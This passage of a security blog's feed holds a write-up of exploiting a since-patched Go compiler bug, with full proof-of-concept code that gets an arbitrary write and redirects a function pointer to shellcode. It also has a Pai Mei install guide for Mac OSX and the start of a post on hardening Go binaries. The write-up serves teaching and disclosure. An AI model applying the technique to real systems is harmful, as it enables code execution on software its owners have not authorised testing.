&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_format.pdf"&gt;slides&lt;/a&gt; &lt;a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;tutorial&lt;/a&gt;&lt;/p&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>Exploiting a Go Binary</title><link href="http://codearcana.com/posts/2013/04/23/exploiting-a-go-binary.html" rel="alternate"></link><published>2013-04-23T00:00:00-07:00</published><updated>2013-04-23T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-23:/posts/2013/04/23/exploiting-a-go-binary.html</id><summary type="html">&lt;p&gt;Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=5336"&gt;this issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but just barely ;-). Props also to ricky for helping to find the underlying cause/writing the patch. Here is a summary of how we did it.&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go
exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=5336"&gt;this
issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code
execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but
just barely ;-). Props also to ricky for helping to find the underlying
cause/writing the patch. Here is a summary of how we did it.&lt;/p&gt;
&lt;p&gt;Note: &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt; is properly sandboxed, so 
code execution there does not
actually let you do anything. Had this been a more serious bug that could
actually be used for anything malicious, we would have immediately reported it
privately. Neither specific vulnerability nor the technique used here work in the latest version of Go (the vulnerability was patched and Go 1.1 introduced non-executable heaps).&lt;/p&gt;
&lt;p&gt;This post is cross posted on the &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1087"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;The Bug&lt;/h3&gt;

&lt;p&gt;Go has support for embedded structs. You can define an embedded struct as follows:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
It is valid to do both &lt;tt&gt;instance.bar&lt;/tt&gt; and &lt;tt&gt;instance.foo&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;The problem comes when you try something slightly trickier:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
When you access &lt;tt&gt;instance.foo&lt;/tt&gt; (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an &lt;tt&gt;Embedded&lt;/tt&gt; struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
&lt;/p&gt;

&lt;h3&gt;The Vulnerability&lt;/h3&gt;

&lt;p&gt;We define an enormous struct and use it to offset memory:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x400100&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="kt"&gt;uint32&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
Now we can do &lt;tt&gt;instance.address = 0xdeadbeef&lt;/tt&gt; and we have written to &lt;tt&gt;0x400100&lt;/tt&gt;! This is the arbitrary write primitive we need.&lt;/p&gt;

&lt;h3&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;Once you have an arbitrary write in go, it is &lt;em&gt;really easy&lt;/em&gt; to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has &lt;em&gt;no randomization&lt;/em&gt; at all, this is as simple as running the program twice. Full exploit below:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;// Address to write, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x50e2f0&lt;/span&gt;
&lt;span class="c1"&gt;// &amp;amp;shellcode, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xc200035160&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;payload&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Nested&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// This magic is necessary is because there is an explict null check if&lt;/span&gt;
  &lt;span class="c1"&gt;// if the offset is greater than 0x1000.&lt;/span&gt;
  &lt;span class="nx"&gt;Embedded&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="c1"&gt;// The issue is that a reference to the embeded struct pointer here&lt;/span&gt;
 &lt;span class="c1"&gt;// will be offset from null (rather than the true base of the struct).&lt;/span&gt;
 &lt;span class="c1"&gt;// We thus just make sizeof(the embedded struct) large enough to point&lt;/span&gt;
 &lt;span class="c1"&gt;// to the address we want to overwrite.&lt;/span&gt;
 &lt;span class="c1"&gt;//&lt;/span&gt;
 &lt;span class="c1"&gt;// See https://code.google.com/p/go/issues/detail?id=5336&lt;/span&gt;
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Nested&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;unused&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

&lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;Struct&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
 &lt;span class="nx"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&amp;quot;&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You should overwrite this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;With this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;***********************************************&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Overwriting &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; with &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

 &lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;What Now?&lt;/h3&gt;

&lt;p&gt;Well, clearly the &lt;a href="https://code.google.com/p/go/source/detail?r=37bf155bc78073d51c0b5706a4f3fba19cca67f4"&gt;issue&lt;/a&gt;
was fixed. I also think it is important for Go to add the protections
that come now standard with C binaries (ASLR, NX) - I posted 
&lt;a href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html"&gt;an article&lt;/a&gt; 
earlier about security in Go where I strongly advocated those protections. 
Luckily, Go 1.1. will be adding some of these protections: specificially, the 
above exploit will not work because &lt;a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0"&gt;Go 1.1  uses a non-executable heap and stack&lt;/a&gt;.&lt;/p&gt;</content><category term="golang"></category><category term="exploitation"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/posts/2012/10/28/pai-mei-on-mac-osx-108.html" rel="alternate"></link><published>2012-10-28T00:00:00-07:00</published><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:/posts/2012/10/28/pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
&lt;h3&gt;Getting the libraries&lt;/h3&gt;

&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
&lt;p&gt;Pai Mei depends on a number of packages:
&lt;ul&gt;
    &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;

&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg -&amp;gt; ../pydbg64/pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;│   ├── libmacdll.dylib&lt;/span&gt;
&lt;span class="go"&gt;│   └── ...&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Running Pai Mei&lt;/h3&gt;

&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gu"&gt;@@ -82,7 +82,7 @@ class PAIMEIapp (wx.App):&lt;/span&gt;
     &amp;#39;&amp;#39;&amp;#39;

     def OnInit (self):
&lt;span class="gd"&gt;-        wx.InitAllImageHandlers()&lt;/span&gt;
&lt;span class="gi"&gt;+#        wx.InitAllImageHandlers()&lt;/span&gt;

         splash = PAIMEIsplash()
         splash.Show()
&lt;span class="gh"&gt;diff --git a/console/support/mysql_connect_dialog.py b/console/support/mysql_connect&lt;/span&gt;
&lt;span class="gh"&gt;index 2201521..b641e37 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -104,7 +104,7 @@ class mysql_connect_dialog(wx.Dialog):&lt;/span&gt;
         self.parent.mysql_password = password

         self.mysql_connect(host, username, password)
&lt;span class="gd"&gt;-        self.Destroy()&lt;/span&gt;
&lt;span class="gi"&gt;+#       self.Destroy()&lt;/span&gt;

     def mysql_connect (self, host, username, password):
         try:
&lt;span class="gh"&gt;diff --git a/utils/process_stalker.py b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gh"&gt;index 987eec9..32206e4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -281,11 +283,15 @@ class process_stalker:&lt;/span&gt;
                                 continue

                         basic_blocks.append(bb.ea_start)

                 if last_dll: self.log(&amp;quot;Setting %d breakpoints on basic blocks in %s
                 else:        self.log(&amp;quot;Setting %d breakpoints on basic blocks in ma

&lt;span class="gd"&gt;-                self.pydbg.bp_set(basic_blocks, restore=self.restore)&lt;/span&gt;
&lt;span class="gi"&gt;+                for block in basic_blocks:&lt;/span&gt;
&lt;span class="gi"&gt;+                       self.pydbg.bp_set(block, restore=self.restore)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -166,7 +166,7 @@ class ProcessListCtrl (wx.ListCtrl, ListCtrlAutoWidthMixin, ColumnSorterMixin):&lt;/span&gt;
             heavy               = self.top.heavy.GetValue(),                \
             ignore_first_chance = self.top.ignore_first_chance.GetValue(),  \
             log                 = self.top.msg,                             \
&lt;span class="gd"&gt;-            main                = main,                                     \&lt;/span&gt;
&lt;span class="gi"&gt;+            main                = self.top.pida_modules.keys()[0],          \&lt;/span&gt;
             mysql               = self.top.main_frame.mysql,                \
             pida_modules        = self.top.pida_modules,                    \
             pydbg               = dbg,                                      \
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</content><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html" rel="alternate"></link><published>2012-05-06T00:00:00-07:00</published><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:/posts/2012/05/06/securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;p&gt;I have spent some time over the past month or so trying to use Go binaries in a secure manner and trying to exploit Go binaries and I thought it would be useful if I talked a little bit about my journey.&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
&lt;/p&gt;

&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;

&lt;p&gt;
Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
&lt;/ul&gt;
I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
&lt;/p&gt;

&lt;p&gt;
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
&lt;/p&gt;

&lt;p&gt;
